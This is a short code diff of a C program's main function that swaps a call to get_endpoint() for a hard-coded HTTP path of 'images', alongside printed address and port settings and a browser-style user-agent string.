@@ -403,7 +403,8 @@ int main(int argc, char* argv[]) {
     }
     printf("Address: %s\n", wurm.http.address);
     printf("Port:%d\n", wurm.http.port);
-    get_endpoint();
+    // get_endpoint();
+    wurm.http.path = "images";
     printf("Path: %s\n", wurm.http.path);
 
     wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
